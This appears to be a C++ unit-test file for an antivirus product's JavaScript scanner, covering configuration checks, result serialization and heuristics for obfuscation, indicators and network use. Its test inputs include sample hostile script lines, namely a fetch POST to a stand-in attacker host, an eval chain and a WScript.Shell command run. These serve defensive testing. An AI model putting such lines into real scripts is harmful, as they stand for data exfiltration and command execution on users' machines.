/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * Unit coverage for deterministic JavaScriptScanner behavior.
 *
 * Focus:
 *   - configuration and helper-name guardrails
 *   - result/obfuscation serialization contracts
 *   - public in-memory heuristic helpers
 *   - lifecycle/statistics behavior without live integrations
 */

#include "pch.h"

#include <gtest/gtest.h>

#include <algorithm>
#include <string>
#include <vector>

#include <nlohmann/json.hpp>

#include "../../../src/Shared_modules/Scripts/JavaScriptScanner.hpp"

namespace ShadowStrike::Scripts::Test {
namespace {

using nlohmann::json;

class JavaScriptScannerTest : public ::testing::Test {
protected:
    void SetUp() override {
        JavaScriptScanner::Instance().Shutdown();
    }

    void TearDown() override {
        JavaScriptScanner::Instance().Shutdown();
    }
};

bool ContainsString(const std::vector<std::string>& values, std::string_view needle) {
    return std::find(values.begin(), values.end(), needle) != values.end();
}

}  // namespace

TEST_F(JavaScriptScannerTest, ConfigurationAndHelperNamesRejectInvalidInputs) {
    JSScanConfig config;
    EXPECT_TRUE(config.IsValid());

    config.maxScriptSize = 0;
    EXPECT_FALSE(config.IsValid());

    config = {};
    config.entropyThreshold = 9.0;
    EXPECT_FALSE(config.IsValid());

    config = {};
    config.emulationTimeoutMs = 0;
    EXPECT_FALSE(config.IsValid());

    config = {};
    config.scanTimeoutMs = 120001;
    EXPECT_FALSE(config.IsValid());

    config = {};
    config.maxDeobfuscationDepth = 0;
    EXPECT_FALSE(config.IsValid());

    EXPECT_EQ(GetJSEngineTypeName(JSEngineType::Electron), "Electron");
    EXPECT_EQ(GetJSObfuscationTypeName(JSObfuscationType::EvalChain), "Eval Chain");
    EXPECT_EQ(GetJSThreatCategoryName(JSThreatCategory::Reconnaissance), "Reconnaissance");
    EXPECT_EQ(GetJSScanStatusName(JSScanStatus::SkippedSizeLimit), "Skipped: Size Limit");
    EXPECT_EQ(GetJSScanStatusName(static_cast<JSScanStatus>(0x12345678)), "Unknown");
    EXPECT_TRUE(IsSuspiciousActiveXObject("WScript.Shell"));
    EXPECT_FALSE(IsSuspiciousActiveXObject("Safe.Custom.Object"));

    const std::string version = JavaScriptScanner::GetVersionString();
    EXPECT_FALSE(version.empty());
    EXPECT_EQ(std::count(version.begin(), version.end(), '.'), 2);
}

TEST_F(JavaScriptScannerTest, ResultAndObfuscationSerializationPreserveBlockingSemantics) {
    JSScanResult cleanResult;
    cleanResult.status = JSScanStatus::Suspicious;
    cleanResult.riskScore = 70;
    EXPECT_FALSE(cleanResult.ShouldBlock());

    JSScanResult maliciousResult;
    maliciousResult.status = JSScanStatus::Malicious;
    maliciousResult.isMalicious = true;
    maliciousResult.riskScore = 95;
    maliciousResult.threatName = "JS/Test";
    maliciousResult.detectedFamily = "Downloader";
    maliciousResult.sha256 = "abc123";
    maliciousResult.scanDuration = std::chrono::microseconds(77);
    maliciousResult.matchedSignatures = {"sig-a"};
    maliciousResult.extractedIOCs = {"https://evil.example/payload.js"};

    EXPECT_TRUE(maliciousResult.ShouldBlock());

    const json resultJson = json::parse(maliciousResult.ToJson());
    EXPECT_EQ(resultJson.at("status"), "Malicious");
    EXPECT_TRUE(resultJson.at("isMalicious").get<bool>());
    EXPECT_EQ(resultJson.at("threatName"), "JS/Test");
    EXPECT_EQ(resultJson.at("matchedSignatures").size(), 1u);
    EXPECT_EQ(resultJson.at("extractedIOCs")[0], "https://evil.example/payload.js");

    JSObfuscationDetails obfuscation;
    obfuscation.primaryType = JSObfuscationType::Base64;
    obfuscation.entropyScore = 6.25;
    obfuscation.confidence = 91.5;
    obfuscation.suspiciousTokenCount = 8;
    obfuscation.deobfuscationLayers = 2;
    obfuscation.deobfuscatedSnippet = "alert(1)";
    obfuscation.fullyDeobfuscated = true;

    const json obfuscationJson = json::parse(obfuscation.ToJson());
    EXPECT_EQ(obfuscationJson.at("primaryType"), static_cast<int>(JSObfuscationType::Base64));
    EXPECT_EQ(obfuscationJson.at("suspiciousTokenCount"), 8);
    EXPECT_TRUE(obfuscationJson.at("fullyDeobfuscated").get<bool>());
    EXPECT_EQ(obfuscationJson.at("deobfuscatedSnippet"), "alert(1)");
}

TEST_F(JavaScriptScannerTest, AnalysisHelpersIdentifyEngineObfuscationIocsAndNetworkUse) {
    auto& scanner = JavaScriptScanner::Instance();
    ASSERT_TRUE(scanner.Initialize());

    JSScanConfig updated = scanner.GetConfig();
    updated.blockObfuscatedScripts = true;
    updated.allowedActiveX = {"Safe.Control"};
    ASSERT_TRUE(scanner.UpdateConfig(updated));
    EXPECT_TRUE(scanner.GetConfig().blockObfuscatedScripts);
    ASSERT_EQ(scanner.GetConfig().allowedActiveX.size(), 1u);

    JSScanConfig invalid = scanner.GetConfig();
    invalid.maxScriptSize = 0;
    EXPECT_FALSE(scanner.UpdateConfig(invalid));
    EXPECT_TRUE(scanner.GetConfig().blockObfuscatedScripts);

    EXPECT_EQ(scanner.DetectEngineType("const http = require('http');"), JSEngineType::NodeJS);
    EXPECT_EQ(scanner.DetectEngineType("var sh = new ActiveXObject('WScript.Shell');"),
              JSEngineType::JScriptWSH);
    EXPECT_EQ(scanner.DetectEngineType("app.alert('x');"), JSEngineType::PDF);

    const auto obfuscation = scanner.AnalyzeObfuscation(
        "eval('a');eval('b');eval('c');eval('d');");
    EXPECT_EQ(obfuscation.primaryType, JSObfuscationType::EvalChain);
    EXPECT_GE(obfuscation.suspiciousTokenCount, 4u);
    EXPECT_GT(obfuscation.confidence, 0.0);

    const auto iocs = scanner.ExtractIOCs(
        "fetch('https://evil.example/payload.js'); "
        "fetch('https://evil.example/payload.js'); "
        "var ip='8.8.8.8'; var loop='127.0.0.1';");
    EXPECT_TRUE(ContainsString(iocs, "https://evil.example/payload.js"));
    EXPECT_TRUE(ContainsString(iocs, "8.8.8.8"));
    EXPECT_FALSE(ContainsString(iocs, "127.0.0.1"));
    EXPECT_EQ(std::count(iocs.begin(), iocs.end(), "https://evil.example/payload.js"), 1);

    const auto activeX = scanner.DetectActiveXUsage(
        "var sh = new ActiveXObject(\"WScript.Shell\");\nsh.Run(\"calc.exe\");");
    ASSERT_FALSE(activeX.empty());
    EXPECT_EQ(activeX.front().objectName, "WScript.Shell");
    EXPECT_TRUE(activeX.front().isSuspicious);
    EXPECT_EQ(activeX.front().lineNumber, 1u);

    const auto network = scanner.DetectNetworkActivity(
        "fetch('https://evil.example/payload.js', { method: 'POST' });"
        "var ip = '8.8.8.8';");
    ASSERT_FALSE(network.empty());
    EXPECT_EQ(network.front().apiUsed, "fetch(");
    EXPECT_EQ(network.front().method, "POST");
    EXPECT_EQ(network.front().target, "https://evil.example/payload.js");
}

TEST_F(JavaScriptScannerTest, InvalidUpdatesAndPreInitializationScansFailSafely) {
    auto& scanner = JavaScriptScanner::Instance();

    const JSScanConfig originalConfig = scanner.GetConfig();
    JSScanConfig invalid = originalConfig;
    invalid.maxScriptSize = 0;

    EXPECT_FALSE(scanner.UpdateConfig(invalid));
    EXPECT_EQ(scanner.GetConfig().maxScriptSize, originalConfig.maxScriptSize);

    const std::string content = "document.cookie = 'session';";
    const auto memoryResult = scanner.ScanMemory(
        std::span<const char>(content.data(), content.size()),
        "browser.js");
    EXPECT_EQ(memoryResult.status, JSScanStatus::ErrorInternal);
    EXPECT_EQ(memoryResult.description, "Scanner not initialized");

    const auto stringResult = scanner.ScanString(content, "browser.js");
    EXPECT_EQ(stringResult.status, JSScanStatus::ErrorInternal);
    EXPECT_EQ(stringResult.description, "Scanner not initialized");
}

TEST_F(JavaScriptScannerTest, StatisticsResetAndMemoryScanningRemainPredictable) {
    auto& scanner = JavaScriptScanner::Instance();
    ASSERT_TRUE(scanner.Initialize());

    const std::string content = "document.cookie = 'session';";
    const auto result = scanner.ScanMemory(
        std::span<const char>(content.data(), content.size()),
        "browser.js");
    EXPECT_NE(result.status, JSScanStatus::ErrorInternal);

    const auto statsAfterScan = scanner.GetStatistics();
    EXPECT_GE(statsAfterScan.totalScans, 1u);

    scanner.ResetStatistics();
    const auto resetStats = scanner.GetStatistics();
    EXPECT_EQ(resetStats.totalScans, 0u);
    EXPECT_EQ(resetStats.cacheHits, 0u);

    JSStatisticsSnapshot snapshot;
    snapshot.totalScans = 4;
    snapshot.maliciousDetected = 1;
    snapshot.downloadersDetected = 2;
    snapshot.startTime = Clock::now();

    const json statsJson = json::parse(snapshot.ToJson());
    EXPECT_EQ(statsJson.at("totalScans"), 4);
    EXPECT_EQ(statsJson.at("downloadersDetected"), 2);
}

TEST_F(JavaScriptScannerTest, RepeatedInitializePreservesExistingConfiguration) {
    auto& scanner = JavaScriptScanner::Instance();

    JSScanConfig initialConfig;
    initialConfig.maxScriptSize = 4096;
    initialConfig.blockObfuscatedScripts = true;
    initialConfig.allowedActiveX = {"Safe.Control"};

    ASSERT_TRUE(scanner.Initialize(initialConfig));
    ASSERT_TRUE(scanner.IsInitialized());

    JSScanConfig replacementConfig = initialConfig;
    replacementConfig.maxScriptSize = 8192;
    replacementConfig.blockObfuscatedScripts = false;
    replacementConfig.allowedActiveX = {"Replacement.Control"};

    ASSERT_TRUE(scanner.Initialize(replacementConfig));

    const auto effectiveConfig = scanner.GetConfig();
    EXPECT_EQ(effectiveConfig.maxScriptSize, initialConfig.maxScriptSize);
    EXPECT_TRUE(effectiveConfig.blockObfuscatedScripts);
    ASSERT_EQ(effectiveConfig.allowedActiveX.size(), 1u);
    EXPECT_EQ(effectiveConfig.allowedActiveX.front(), "Safe.Control");
}

}  // namespace ShadowStrike::Scripts::Test
